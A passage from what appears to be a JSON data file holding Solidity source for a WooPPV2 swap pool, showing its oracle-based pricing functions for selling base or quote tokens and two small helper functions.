baseAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 quoteAmount, uint256 newPrice) {\n        require(state.woFeasible, \"WooPPV2: !ORACLE_FEASIBLE\");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * price * base_amount; and decimal 18\n        uint256 gamma;\n        {\n            uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;\n            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, \"WooPPV2: !maxNotionalValue\");\n\n            gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, \"WooPPV2: !gamma\");\n\n            // Formula: quoteAmount = baseAmount * oracle.price * (1 - oracle.k * baseAmount * oracle.price - oracle.spread)\n            quoteAmount =\n                (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                decs.baseDec;\n        }\n\n        // newPrice = oracle.price * (1 - k * oracle.price * baseAmount)\n        newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;\n    }\n\n    function _calcBaseAmountSellQuote(\n        address baseToken,\n        uint256 quoteAmount,\n        IWooracleV2.State memory state\n    ) private view returns (uint256 baseAmount, uint256 newPrice) {\n        require(state.woFeasible, \"WooPPV2: !ORACLE_FEASIBLE\");\n\n        DecimalInfo memory decs = decimalInfo(baseToken);\n\n        // gamma = k * quote_amount; and decimal 18\n        uint256 gamma;\n        {\n            require(quoteAmount <= tokenInfos[baseToken].maxNotionalSwap, \"WooPPV2: !maxNotionalValue\");\n\n            gamma = (quoteAmount * state.coeff) / decs.quoteDec;\n            require(gamma <= tokenInfos[baseToken].maxGamma, \"WooPPV2: !gamma\");\n\n            // Formula: baseAmount = quoteAmount / oracle.price * (1 - oracle.k * quoteAmount - oracle.spread)\n            baseAmount =\n                (((quoteAmount * decs.baseDec * decs.priceDec) / state.price) *\n                    (uint256(1e18) - gamma - state.spread)) /\n                1e18 /\n                decs.quoteDec;\n        }\n\n        // new_price = oracle.price / (1 - k * quoteAmount)\n        newPrice = (uint256(1e18) * state.price) / (uint256(1e18) - gamma);\n    }\n\n    function _maxUInt16(uint16 a, uint16 b) private pure returns (uint16) {\n        return a > b ? a : b;\n    }\n\n    function _maxUInt64(uint64 a, uint64 b) private pure returns (uint64) {\n        return a > b ? a : b;\n    }\n}"
    }
  ]
}